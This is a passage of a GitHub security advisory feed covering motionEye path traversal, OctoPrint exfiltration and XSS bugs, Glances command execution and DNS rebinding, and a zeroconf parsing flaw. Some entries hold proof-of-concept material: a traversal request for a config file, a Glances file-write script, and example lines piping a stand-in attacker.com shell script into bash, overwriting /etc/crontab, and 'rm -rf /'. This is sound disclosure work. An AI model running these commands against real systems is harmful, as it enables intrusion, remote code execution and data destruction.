<p>The affected handlers accept a user-controlled filename parameter and construct filesystem paths using <code>os.path.join()</code>. When an absolute path is supplied, Python discards the configured media directory and returns the attacker-supplied path directly. The application then bypasses Tornado's built-in path validation by overriding the relevant safety checks.</p>
<p>As a result, an attacker can access files outside of the configured camera media directory, subject to the permissions of the motionEye process.</p>
<h3 id="details">Details</h3>
<p>The issue exists in the media playback and download functionality.</p>
<p>The filename parameter is passed to <code>mediafiles.get_media_path()</code>:</p>
<pre><code class="language-python">def get_media_path(camera_config, path, media_type):
    target_dir = camera_config.get('target_dir')
    full_path = os.path.join(target_dir, path)
    return full_path
</code></pre>
<p>When path is an absolute path (e.g. <code>/etc/motioneye/motion.conf</code>), Python's <code>os.path.join()</code> discards <code>target_dir</code> entirely and returns the absolute path as-is. This would normally be caught by Tornado's StaticFileHandler path validation, but MoviePlaybackHandler explicitly overrides both safety checks (<code>movie_playback.py</code> lines 111-115):</p>
<pre><code>def get_absolute_path(self, root, path):
    return path

def validate_absolute_path(self, root, absolute_path):
    return absolute_path
</code></pre>
<p>This allows reading any file on the filesystem that the motionEye process can access.</p>
<p>The same path traversal exists in the movie download, picture download, and picture preview handlers:</p>
<ul>
<li>GET /movie//download/</li>
<li>GET /picture//download/</li>
<li>GET /picture//preview/</li>
</ul>
<h1 id="poc">PoC</h1>
<pre><code>GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1
Host: target:8765
</code></pre>
<h1 id="fix">Fix</h1>
<p>Do not allow absolute paths supplied by user input.</p>
<p>Validate that the fully resolved canonical path remains within the configured camera media directory before serving a file.</p>
<p>Additionally, Tornado’s built-in path validation should not be bypassed unless equivalent validation is performed by motionEye.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-rw9q-97r9-8gvh">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-rw9q-97r9-8gvh</a></li>
<li><a href="https://github.com/advisories/GHSA-rw9q-97r9-8gvh">https://github.com/advisories/GHSA-rw9q-97r9-8gvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rw9q-97r9-8gvh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T18:32:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] OctoPrint has possible file exfiltration via query parameters on upload endpoints]]></title>
        <id>https://github.com/advisories/GHSA-j4h9-pm27-4rfw</id>
        <link href="https://github.com/advisories/GHSA-j4h9-pm27-4rfw"/>
        <updated>2026-06-23T18:03:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up until and including 1.11.7 as well as 2.0.0rc1 and 2.0.0rc2 contain a vulnerability that allows an attacker with the <code>FILE_UPLOAD</code> permission to exfiltrate files from the host that OctoPrint has read access to, by moving them into the upload folder where they then can be downloaded from. This vulnerability was already reported as <a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-m9jh-jf9h-x3h2">GHSA-m9jh-jf9h-x3h2/CVE-2025-48067</a> but the fix provided in OctoPrint 1.11.2 turned out to be incomplete.</p>
<p>The primary risk lies in the potential exfiltration of secrets stored inside OctoPrint's config, or further system files. By removing important runtime files, this could also be used to impact the availability of the host after an attempted server restart. Given that the attacker requires a user account with file upload permissions, the actual impact of this should however hopefully be minimal in most cases.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 1.11.8 and 2.0.0rc3.</p>
<h3 id="details">Details</h3>
<p>OctoPrint's web application is implemented in Flask, but uploads are first intercepted by a custom upload handler built on Tornado that sits in front of it. The handler streams the upload to a temporary file on disk - so files larger than the available memory can be uploaded - and rewrites the request, adding internal form fields that tell Flask where to find that temporary file.</p>
<p>These fields are reserved and meant to be set only by the upload handler, never by the client. The previous fix from <a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-m9jh-jf9h-x3h2">GHSA-m9jh-jf9h-x3h2/CVE-2025-48067</a> stripped them from the request received from the client when they were sent as multipart form fields, yet they could still reach Flask through other channels: as plain query parameters, or - since the Tornado handler and Flask did not parse requests identically - smuggled in via several "parser differentials" that looked harmless to the handler while Flask still saw the injected fields. Any of these let an attacker make OctoPrint treat an arbitrary file on the host as a freshly uploaded one and move it into the upload folder.</p>
<p>The following endpoints in OctoPrint are affected:</p>
<ul>
<li><code>/api/files/{local|sdcard}</code></li>
<li><code>/api/languages</code></li>
<li><code>/plugin/backup/restore</code></li>
<li><code>/plugin/pluginmanager/upload_file</code></li>
</ul>
<p>Further upload endpoints in third party plugins might be affected too.</p>
<p>The fix rejects requests carrying any of the reserved fields, aligns the Tornado handler's request parsing with Flask's (Werkzeug) to avoid any differential parsing, and re-validates the request rewritten by Tornado before forwarding it to Flask.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Koh Jun Sheng and Jacopo Tediosi.</p>
<h3 id="timeline">Timeline</h3>
<p>2026-06-04: Report received
2026-06-04: Report acknowledged
2026-06-08: Report verified
2026-06-17: Fix ready for 1.11.x
2026-06-22: Fix ported to 2.0.0
2026-06-23: Fix released with 1.11.8 and 2.0.0rc3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-j4h9-pm27-4rfw">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-j4h9-pm27-4rfw</a></li>
<li><a href="https://github.com/advisories/GHSA-j4h9-pm27-4rfw">https://github.com/advisories/GHSA-j4h9-pm27-4rfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j4h9-pm27-4rfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T18:03:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] OctoPrint has possible file exfiltration via query parameters on upload endpoints]]></title>
        <id>https://github.com/advisories/GHSA-j4h9-pm27-4rfw</id>
        <link href="https://github.com/advisories/GHSA-j4h9-pm27-4rfw"/>
        <updated>2026-06-23T18:03:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up until and including 1.11.7 as well as 2.0.0rc1 and 2.0.0rc2 contain a vulnerability that allows an attacker with the <code>FILE_UPLOAD</code> permission to exfiltrate files from the host that OctoPrint has read access to, by moving them into the upload folder where they then can be downloaded from. This vulnerability was already reported as <a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-m9jh-jf9h-x3h2">GHSA-m9jh-jf9h-x3h2/CVE-2025-48067</a> but the fix provided in OctoPrint 1.11.2 turned out to be incomplete.</p>
<p>The primary risk lies in the potential exfiltration of secrets stored inside OctoPrint's config, or further system files. By removing important runtime files, this could also be used to impact the availability of the host after an attempted server restart. Given that the attacker requires a user account with file upload permissions, the actual impact of this should however hopefully be minimal in most cases.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 1.11.8 and 2.0.0rc3.</p>
<h3 id="details">Details</h3>
<p>OctoPrint's web application is implemented in Flask, but uploads are first intercepted by a custom upload handler built on Tornado that sits in front of it. The handler streams the upload to a temporary file on disk - so files larger than the available memory can be uploaded - and rewrites the request, adding internal form fields that tell Flask where to find that temporary file.</p>
<p>These fields are reserved and meant to be set only by the upload handler, never by the client. The previous fix from <a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-m9jh-jf9h-x3h2">GHSA-m9jh-jf9h-x3h2/CVE-2025-48067</a> stripped them from the request received from the client when they were sent as multipart form fields, yet they could still reach Flask through other channels: as plain query parameters, or - since the Tornado handler and Flask did not parse requests identically - smuggled in via several "parser differentials" that looked harmless to the handler while Flask still saw the injected fields. Any of these let an attacker make OctoPrint treat an arbitrary file on the host as a freshly uploaded one and move it into the upload folder.</p>
<p>The following endpoints in OctoPrint are affected:</p>
<ul>
<li><code>/api/files/{local|sdcard}</code></li>
<li><code>/api/languages</code></li>
<li><code>/plugin/backup/restore</code></li>
<li><code>/plugin/pluginmanager/upload_file</code></li>
</ul>
<p>Further upload endpoints in third party plugins might be affected too.</p>
<p>The fix rejects requests carrying any of the reserved fields, aligns the Tornado handler's request parsing with Flask's (Werkzeug) to avoid any differential parsing, and re-validates the request rewritten by Tornado before forwarding it to Flask.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Koh Jun Sheng and Jacopo Tediosi.</p>
<h3 id="timeline">Timeline</h3>
<p>2026-06-04: Report received
2026-06-04: Report acknowledged
2026-06-08: Report verified
2026-06-17: Fix ready for 1.11.x
2026-06-22: Fix ported to 2.0.0
2026-06-23: Fix released with 1.11.8 and 2.0.0rc3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-j4h9-pm27-4rfw">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-j4h9-pm27-4rfw</a></li>
<li><a href="https://github.com/advisories/GHSA-j4h9-pm27-4rfw">https://github.com/advisories/GHSA-j4h9-pm27-4rfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j4h9-pm27-4rfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T18:03:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances has arbitrary file write and command execution via `secure_popen` redirection and chaining operators in AMP command configuration]]></title>
        <id>https://github.com/advisories/GHSA-3vwc-qwhc-3mj7</id>
        <link href="https://github.com/advisories/GHSA-3vwc-qwhc-3mj7"/>
        <updated>2026-06-23T17:59:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>secure_popen()</code> function in <code>glances/secure.py</code> interprets <code>&gt;</code> (file redirection), <code>|</code> (pipe), and <code>&amp;&amp;</code> (command chaining) operators in command strings. These operators are applied without any validation on the target file path, piped command, or chained command.</p>
<p>When Application Monitoring Process (AMP) modules load their <code>command</code> or <code>service_cmd</code> configuration values from <code>glances.conf</code>, those values are passed directly to <code>secure_popen()</code> with no sanitization. This allows an attacker who can modify the Glances configuration file to write arbitrary content to arbitrary filesystem paths (via <code>&gt;</code>), chain arbitrary commands (via <code>&amp;&amp;</code>), or pipe command output to arbitrary programs (via <code>|</code>).</p>
<p>Crucially, this vulnerability is <strong>not mitigated</strong> by the <code>--disable-config-exec</code> flag that was introduced to address CVE-2026-33641. That flag only disables backtick command execution in <code>config.get_value()</code>; it does not affect the <code>secure_popen()</code> function's interpretation of shell-like operators.</p>
<h3 id="details">Details</h3>
<p><strong>Affected code path 1 — Default AMP (<code>glances/amps/default/__init__.py:69</code>)</strong></p>
<pre><code class="language-python">res = self.get('command')
# ...
self.set_result(secure_popen(res).rstrip())
</code></pre>
<p>The <code>command</code> config value is loaded from <code>[amp_&lt;name&gt;]</code> sections via <code>GlancesAmp.load_config()</code> (<code>glances/amps/amp.py:81</code>):</p>
<pre><code class="language-python">self.configs[param] = config.get_value(amp_section, param).split(',')
</code></pre>
<p><strong>Affected code path 2 — SystemV AMP (<code>glances/amps/systemv/__init__.py:60</code>)</strong></p>
<pre><code class="language-python">res = secure_popen(self.get('service_cmd'))
</code></pre>
<p>The <code>service_cmd</code> config value is loaded from <code>[amp_systemv]</code> sections via the same <code>GlancesAmp.load_config()</code> method.</p>
<p><strong>Sink — <code>secure_popen()</code> (<code>glances/secure.py:33-77</code>)</strong></p>
<p>The function explicitly parses:</p>
<ul>
<li><code>&gt;</code> for file redirection (line 39): <code>cmd.split('&gt;')</code> — the path after <code>&gt;</code> is used directly in <code>open(stdout_redirect, "w")</code> (line 71) with <strong>no path validation</strong>.</li>
<li><code>|</code> for command piping (line 51): <code>cmd.split('|')</code> — each segment is executed as a separate <code>Popen</code> with stdout piped to the next.</li>
<li><code>&amp;&amp;</code> for command chaining (line 27 in <code>secure_popen</code>): <code>cmd.split('&amp;&amp;')</code> — each segment is executed sequentially.</li>
</ul>
<p>None of these operators are sanitized or restricted when loading AMP configuration values.</p>
<p><strong>Why <code>--disable-config-exec</code> does not help:</strong></p>
<p>The <code>--disable-config-exec</code> flag (introduced for CVE-2026-33641) only prevents <code>system_exec()</code> from running backtick-embedded commands in <code>config.get_value()</code>. It does not affect how the resulting string value is processed by <code>secure_popen()</code>. A command value like <code>echo data &gt; /etc/crontab</code> contains no backticks and passes through <code>get_value()</code> unchanged, then <code>secure_popen()</code> interprets the <code>&gt;</code> operator and writes to the arbitrary path.</p>
<h3 id="poc">PoC</h3>
<p><strong>Clean-checkout recipe:</strong></p>
<ol>
<li>Create a test configuration file:</li>
</ol>
<pre><code class="language-bash">cat &gt; /tmp/poc-glances.conf &lt;&lt; 'EOF'
[amp_poc]
enable=true
regex=.*
refresh=3
command=echo POC_ARBITRARY_FILE_WRITE &gt; /tmp/cve-poc-marker-amp

[outputs]
cors_origins=*
EOF
</code></pre>
<ol start="2">
<li>Run a Python script that simulates the AMP command execution path:</li>
</ol>
<pre><code class="language-python">import sys
sys.path.insert(0, '/path/to/glances')
from glances.config import Config
from glances.secure import secure_popen
import os

# Load config with --disable-config-exec ACTIVE (CVE-2026-33641 mitigation)
config = Config(config_dir='/tmp/poc-glances.conf', disable_config_exec=True)

# Read AMP command value (same as amp.py load_config)
command = config.get_value('amp_poc', 'command')
print(f'Command: {command!r}')

# Execute (same as amps/default/__init__.py line 69)
marker = '/tmp/cve-poc-marker-amp'
assert not os.path.exists(marker), 'Clean state required'
result = secure_popen(command)
print(f'Result: {result!r}')

# Verify arbitrary file write occurred
assert os.path.exists(marker), 'VULNERABILITY NOT CONFIRMED'
with open(marker) as f:
    content = f.read()
print(f'Written to {marker}: {content!r}')
assert 'POC_ARBITRARY_FILE_WRITE' in content

# Cleanup
os.remove(marker)
print('CONFIRMED: Arbitrary file write via secure_popen &gt; in AMP command')
</code></pre>
<p><strong>Expected vulnerable output:</strong></p>
<pre><code>Command: 'echo POC_ARBITRARY_FILE_WRITE &gt; /tmp/cve-poc-marker-amp'
Result: 'POC_ARBITRARY_FILE_WRITE\n'
Written to /tmp/cve-poc-marker-amp: 'POC_ARBITRARY_FILE_WRITE\n'
CONFIRMED: Arbitrary file write via secure_popen &gt; in AMP command
</code></pre>
<p><strong>Negative/control case (demonstrating <code>--disable-config-exec</code> only blocks backticks):</strong></p>
<pre><code class="language-python"># This IS blocked by --disable-config-exec:
# command=`rm -rf /` → get_value() skips backtick execution

# This is NOT blocked by --disable-config-exec:
# command=echo data &gt; /etc/crontab → secure_popen writes to /etc/crontab
</code></pre>
<p><strong>Cleanup:</strong></p>
<pre><code class="language-bash">rm -f /tmp/poc-glances.conf /tmp/cve-poc-marker-amp
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker who can modify <code>glances.conf</code> (e.g., through a separate file-write vulnerability, a misconfigured shared filesystem, a configuration management system, or a container volume mount) can:</p>
<ol>
<li><p><strong>Write arbitrary content to arbitrary files</strong> via the <code>&gt;</code> operator — e.g., overwriting <code>/etc/crontab</code>, <code>~/.ssh/authorized_keys</code>, or any file writable by the Glances process user.</p>
</li>
<li><p><strong>Execute arbitrary commands</strong> via the <code>&amp;&amp;</code> and <code>|</code> operators — e.g., <code>echo x &amp;&amp; curl http://attacker.com/shell.sh | bash</code>.</p>
</li>
<li><p><strong>Exfiltrate data</strong> via the <code>|</code> operator piping command output to network utilities.</p>
</li>
</ol>
<p>The existing <code>--disable-config-exec</code> mitigation for CVE-2026-33641 does not protect against this vulnerability because it operates at a different layer (<code>config.get_value()</code> backtick processing vs. <code>secure_popen()</code> operator interpretation).</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ol>
<li><p><strong>Remove file redirection support from <code>secure_popen()</code></strong> unless explicitly required. The <code>&gt;</code> operator in <code>__secure_popen()</code> (lines 39-45, 69-72) writes to arbitrary paths. Consider removing this feature or restricting output paths to a safe directory (e.g., a configured output directory with path traversal protection).</p>
</li>
<li><p><strong>Sanitize AMP command values</strong> before passing them to <code>secure_popen()</code>. Apply the same sanitization used in <code>actions.py:_sanitize_mustache_dict()</code> to strip <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;&gt;</code>, and <code>&gt;</code> from AMP command and service_cmd config values, or refuse to execute commands containing these operators.</p>
</li>
<li><p><strong>Consider replacing <code>secure_popen()</code> with <code>subprocess.run(shell=False)</code></strong> using explicit argument arrays. The <code>secure_popen()</code> function reimplements shell-like operator parsing (<code>&amp;&amp;</code>, <code>|</code>, <code>&gt;</code>) which is inherently risky. Standard <code>subprocess.run()</code> with <code>shell=False</code> and an explicit argument list avoids this class of vulnerability entirely.</p>
</li>
<li><p><strong>Add a regression test</strong> that verifies AMP commands cannot contain file redirection or command chaining operators.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-3vwc-qwhc-3mj7">https://github.com/nicolargo/glances/security/advisories/GHSA-3vwc-qwhc-3mj7</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-3vwc-qwhc-3mj7">https://github.com/advisories/GHSA-3vwc-qwhc-3mj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vwc-qwhc-3mj7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-23T17:59:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] OctoPrint has XSS in its Suppressed Command Notifications]]></title>
        <id>https://github.com/advisories/GHSA-p6qx-ghxm-389h</id>
        <link href="https://github.com/advisories/GHSA-p6qx-ghxm-389h"/>
        <updated>2026-06-23T17:15:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up to and including 1.11.7 as well as 2.0.0rc1 and 2.0.0rc2 are affected by a vulnerability that allows injection of arbitrary HTML and JavaScript into Suppressed Command notifications popups generated by the printer.</p>
<p>An attacker who successfully convinces a victim to print a specially crafted file could exploit this issue to disrupt ongoing prints, extract information (including sensitive configuration settings, if the targeted user has the necessary permissions for that), or perform other actions on behalf of the targeted user within the OctoPrint instance.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 1.11.8 and 2.0.0rc3.</p>
<h3 id="workaround">Workaround</h3>
<p>OctoPrint administrators can mitigate the risk by disabling popups:</p>
<ul>
<li>for Action Command notifications, set <em>OctoPrint Settings -&gt; Serial Connection -&gt; Behaviour -&gt; Sanity Checking -&gt; Display notifications for suppressed commands</em> to <em>Never show notifications</em></li>
</ul>
<p>It is also strongly recommended to ensure that files being printed originate from trusted sources, and, whenever possible, are sliced with an application's own slicer.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by <a href="https://github.com/jacopotediosi">Jacopo Tediosi</a>.</p>
<h3 id="timeline">Timeline</h3>
<p>2026-03-18: Report received
2026-04-01: Report verified
2026-04-01: Fix ready for 2.0.0
2026-06-22: Fix backported to 1.11.x
2026-06-23: Fix released with 1.11.8 and 2.0.0rc3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-p6qx-ghxm-389h">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-p6qx-ghxm-389h</a></li>
<li><a href="https://github.com/advisories/GHSA-p6qx-ghxm-389h">https://github.com/advisories/GHSA-p6qx-ghxm-389h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6qx-ghxm-389h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T17:15:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OctoPrint] OctoPrint has XSS in its Suppressed Command Notifications]]></title>
        <id>https://github.com/advisories/GHSA-p6qx-ghxm-389h</id>
        <link href="https://github.com/advisories/GHSA-p6qx-ghxm-389h"/>
        <updated>2026-06-23T17:15:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OctoPrint versions up to and including 1.11.7 as well as 2.0.0rc1 and 2.0.0rc2 are affected by a vulnerability that allows injection of arbitrary HTML and JavaScript into Suppressed Command notifications popups generated by the printer.</p>
<p>An attacker who successfully convinces a victim to print a specially crafted file could exploit this issue to disrupt ongoing prints, extract information (including sensitive configuration settings, if the targeted user has the necessary permissions for that), or perform other actions on behalf of the targeted user within the OctoPrint instance.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in version 1.11.8 and 2.0.0rc3.</p>
<h3 id="workaround">Workaround</h3>
<p>OctoPrint administrators can mitigate the risk by disabling popups:</p>
<ul>
<li>for Action Command notifications, set <em>OctoPrint Settings -&gt; Serial Connection -&gt; Behaviour -&gt; Sanity Checking -&gt; Display notifications for suppressed commands</em> to <em>Never show notifications</em></li>
</ul>
<p>It is also strongly recommended to ensure that files being printed originate from trusted sources, and, whenever possible, are sliced with an application's own slicer.</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by <a href="https://github.com/jacopotediosi">Jacopo Tediosi</a>.</p>
<h3 id="timeline">Timeline</h3>
<p>2026-03-18: Report received
2026-04-01: Report verified
2026-04-01: Fix ready for 2.0.0
2026-06-22: Fix backported to 1.11.x
2026-06-23: Fix released with 1.11.8 and 2.0.0rc3</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-p6qx-ghxm-389h">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-p6qx-ghxm-389h</a></li>
<li><a href="https://github.com/advisories/GHSA-p6qx-ghxm-389h">https://github.com/advisories/GHSA-p6qx-ghxm-389h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p6qx-ghxm-389h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-23T17:15:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zeroconf] zeroconf: Unvalidated rdlength in record payload readers allows LAN-local cache corruption via crafted mDNS packet]]></title>
        <id>https://github.com/advisories/GHSA-qc2x-6f54-m6h9</id>
        <link href="https://github.com/advisories/GHSA-qc2x-6f54-m6h9"/>
        <updated>2026-06-22T23:07:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>_read_character_string</code> and <code>_read_string</code> in <code>src/zeroconf/_protocol/incoming.py</code> sliced <code>self.data[self.offset : self.offset + length]</code> and advanced <code>self.offset</code> by the declared <code>length</code> without checking it against <code>self._data_len</code>. Python's slice silently returns fewer bytes when the end index runs past the buffer, so a record whose 16-bit RDLENGTH (RFC 1035 §3.2.1) over-advertised by tens of kilobytes was constructed from a truncated payload, appended to <code>DNSIncoming._answers</code>, and committed to the cache before any later parse failure surfaced. The follow-up <code>_read_name</code> for the next record then failed, but the corrupt record had already entered the answer list and propagated to <code>DNSCache</code> and <code>ServiceInfo</code>.</p>
<p>Any unauthenticated host on the local link (UDP/5353, <code>224.0.0.251</code> / <code>ff02::fb</code>) can multicast a single mDNS response carrying a TXT, HINFO, or A/AAAA record that advertises rdlength=65535 and only a handful of real payload bytes; consumers calling <code>ServiceInfo.properties</code> then parse the truncated bytes as if they matched the wire, and downstream integrations (Home Assistant and other zeroconf-driven discovery) trust the decoded record. The bug is parser-state desync rather than RCE, but it seeds the cache with attacker-shaped key/value and address records for a TTL window and is a building block for higher-impact chains.</p>
<p>The impact is likely lower than the other recently released advisories as there is no additional risk of OOM so the severity was manually set to low to override the score CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (6.5, Medium) since that doesn't fully consider the mDNS threat model.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>zeroconf</code> 0.149.16 (<a href="https://github.com/python-zeroconf/python-zeroconf/pull/1756">PR #1756</a>).  Note that this change originally intended to ship in 0.149.13 but we ran out of space on PyPI: see <a href="https://github.com/python-zeroconf/python-zeroconf/issues/1769">https://github.com/python-zeroconf/python-zeroconf/issues/1769</a></p>
<p>Upgrade to <code>&gt;= 0.149.16</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no in-process workaround; upgrading is the fix. Otherwise, restrict mDNS (UDP/5353) to trusted Layer-2 segments via AP client isolation, guest-network separation, or host firewall rules.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1756">PR #1756</a>, fix</li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1752">Issue #1752</a>, public tracking issue</li>
<li><a href="https://www.rfc-editor.org/rfc/rfc1035#section-3.2.1">RFC 1035 §3.2.1</a>, <a href="https://www.rfc-editor.org/rfc/rfc1035#section-3.3">RFC 1035 §3.3</a>, <a href="https://cwe.mitre.org/data/definitions/130.html">CWE-130</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-qc2x-6f54-m6h9">https://github.com/python-zeroconf/python-zeroconf/security/advisories/GHSA-qc2x-6f54-m6h9</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/issues/1752">https://github.com/python-zeroconf/python-zeroconf/issues/1752</a></li>
<li><a href="https://github.com/python-zeroconf/python-zeroconf/pull/1756">https://github.com/python-zeroconf/python-zeroconf/pull/1756</a></li>
<li><a href="https://github.com/advisories/GHSA-qc2x-6f54-m6h9">https://github.com/advisories/GHSA-qc2x-6f54-m6h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qc2x-6f54-m6h9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T23:07:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances: XML-RPC Server Missing Host Header Validation Enables DNS Rebinding Attack]]></title>
        <id>https://github.com/advisories/GHSA-w856-8p3r-p338</id>
        <link href="https://github.com/advisories/GHSA-w856-8p3r-p338"/>
        <updated>2026-06-22T21:31:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Glances XML-RPC server (<code>glances -s</code>, implemented in <code>glances/server.py</code>) does not validate the HTTP <code>Host</code> header, leaving it vulnerable to DNS rebinding attacks.  CVE-2026-32632 (patched in 4.5.2) added <code>TrustedHostMiddleware</code> to the REST/WebUI server; the MCP server has had equivalent protection since 4.5.1. The XML-RPC server received neither fix and has no <code>allowed-hosts</code> configuration key.  Combined with the unrestricted <code>Access-Control-Allow-Origin: *</code> header (see companion advisory for CVE-2026-33533 and its incomplete fix), an attacker can exploit DNS rebinding to exfiltrate the full system monitoring dataset from a victim's browser.</p>
<hr>
<h3 id="details">Details</h3>
<p><strong>Affected component:</strong> <code>glances/server.py</code> — <code>GlancesXMLRPCHandler</code> / <code>GlancesXMLRPCServer</code></p>
<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py</a></li>
</ul>
<p>Contrast — patched backends:</p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_restful_api.py">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_restful_api.py</a></li>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_mcp.py">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outputs/glances_mcp.py</a></li>
</ul>
<p>The <code>GlancesXMLRPCHandler</code> class inherits from Python's <code>xmlrpc.server.SimpleXMLRPCRequestHandler</code> and does not override <code>parse_request()</code> to inspect or validate the <code>Host</code> header.</p>
<p>Contrast this with the two other Glances server backends, both of which received host-validation hardening:</p>
<p><strong>REST / WebUI server</strong> (<code>glances/outputs/glances_restful_api.py</code>) — patched in 4.5.2:</p>
<pre><code class="language-python"># glances_restful_api.py
if self.webui_allowed_hosts:
    self._app.add_middleware(
        TrustedHostMiddleware,
        allowed_hosts=self.webui_allowed_hosts,
    )
</code></pre>
<p><strong>MCP server</strong> (<code>glances/outputs/glances_mcp.py</code>) — protected since 4.5.1:</p>
<pre><code class="language-python"># glances_mcp.py
TransportSecuritySettings(
    allowed_hosts=self.mcp_allowed_hosts,
    ...
)
</code></pre>
<p><strong>XML-RPC server</strong> (<code>glances/server.py</code>) — no equivalent exists:</p>
<pre><code class="language-python">class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):
    # No Host header check; any Host value is accepted
    rpc_paths = ('/RPC2',)
    ...
</code></pre>
<p>There is no <code>xmlrpc_allowed_hosts</code> (or equivalent) configuration key in <code>glances.conf</code>, and the server ignores the <code>Host</code> header on every incoming request.</p>
<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
<p>Test results:</p>
<table>
<thead>
<tr>
<th>Server type</th>
<th>Host header</th>
<th>HTTP status</th>
<th>Data returned</th>
